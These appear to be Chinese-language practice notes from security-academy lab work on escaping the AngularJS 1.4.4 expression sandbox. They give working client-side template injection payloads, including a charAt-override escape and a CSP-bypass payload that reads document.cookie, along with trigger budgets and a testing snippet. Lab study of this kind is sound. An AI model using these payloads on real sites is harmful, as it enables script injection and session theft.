---
title: AngularJS 1.4.4 sandbox escape practice notes
---

# AngularJS 1.4.4 sandbox escape practice notes

Family: [[client-side-template-injection-family]]. 在 Academy CSTI 两题(批38 起、批45R 收口 CSP 题)上用 `browser_suite eval` + 页面自带 injector 实测:`angular.element(document.body).injector().get('$parse')`。

## 两条可用的逃逸腿

1. **charAt override**(废掉沙箱的 AST 重写):`toString().constructor.prototype.charAt=[].join`。执行后 `String.prototype.charAt` 即 `[].join`,`isIdent()` 恒真,该次**之后**的 parse 不再插守卫。 - 只对**后续** parse 生效 ⇒ 载荷必须在那之后被 parse(另一个参数、或 runtime 求值的 `orderBy` 字符串谓词)。 - **"override 之后编译出来的东西是坏的"是拆分调用造成的假象(批49 作废)**:把 override 与载荷拆成**两次独立** `$parse` 调用时会看到 NaN / 静默 no-op;但把两者写进**同一条表达式**(override 作语句1,`[1]|orderBy:…` 作语句2)时,`orderBy` 在运行时编译的谓词工作正常。
- **without-strings 题的成文载荷**(批49 已收口):`?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`。服务端每个参数生成 `var key='<参数名>'; $scope.query[key]='<值>'; $scope.value=$parse(key)($scope.query);`(顺序 = Java HashMap),**参数名**即表达式,名字里的 `=` 要发 `%3D`。见 [[records/lab-angular-sandbox-escape-without-strings]]。 2. **CSP 变体(已收口)**:`ng-csp` 下 Function 构造器不可用,走 Angular 自有事件 + `$event.composedPath()`(返数组、过 expensive 检查,末元素是 window)+ `|orderBy:'<谓词>'`(字符串谓词由非 expensive 的 `$parse` 编译、以每个数组元素为 scope 求值)+ `(y=alert)(document.cookie)`(赋值式调用绕 isecwindow;裸 `alert(...)` 报 isecwindow)。

## 预算与触发(CSP 变体,80 字符上限)

- 服务端硬限 80:响应正文 `"Search term cannot exceed 80 characters"`;重复参数不放大(`?search=A&search=B` 反射最后一个,超长照样 400)。 - 78 字符: `<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>`(79 含 `>`;不带闭合 `>` 会被反射尾部的 `'</h1>` 拼坏)。 - `autofocus` 需 +10 ⇒ 超限;`event.path` 在本版 Chrome 已移除(**-10 的省字符路不存在**),所以「片段聚焦」是唯一在预算内的触发,而它在**聚焦态文档**里工作正常(见 [[focus-触发载荷判读-先让文档处于聚焦态]])。 - 参数不足时可以补:反射前缀是 `N search results for '<值>'`,尾部固定 `'</h1>`。

## 陷阱清单(逐条实测)

- **只有字符串形谓词逐元素求值**:`orderBy:'…'` ✓;`orderBy:…`(无引号)只在外层 scope 求值一次 = 空操作;`filter:'…'` → `Maximum call stack size exceeded`(filterFilter 对字符串走子串匹配,遇 window 递归)。 - 无引号属性值里 `'` 会被 HTML 解析器连同值一起吞(parse error 但 append)⇒ 值仍正确,但**没有闭合 `>` 时尾部 `'</h1>` 会被拼进值**。 - 参数字典序不成立:lab-angular-sandbox-escape-without-strings 的服务端是 **Java HashMap 顺序**(实测 override 落到最后);且**必须带 `search` 参数**才生成 controller 循环,否则整段脚本不渲染。 - 该题的参数**值**被 HTML 转义(`'`→`&apos;`)⇒ 值破串封死;参数**名**才是表达式。 - CSP 题页面无内联脚本空间(`script-src 'self'`),一切必须走 Angular 表达式。

## oracle 法(免导航判表达式)

`var $p = angular.element(document.body).injector().get('$parse'); var path; var probe=document.createElement('input'); document.body.appendChild(probe); probe.addEventListener('focus', e => { path = e.composedPath(); }); probe.dispatchEvent(new FocusEvent('focus')); $p(EXPR, null, true)(scope, {$event:{composedPath:()=>path}});   // 用真 scope + 真 composedPath`

## 相关

- 判读纪律(聚焦态、$applyAsync 异步读回)见 [[focus-触发载荷判读-先让文档处于聚焦态]];族矩阵见 [[client-side-template-injection-family]];事件/注入件用法见 [[browse-cdp]]。
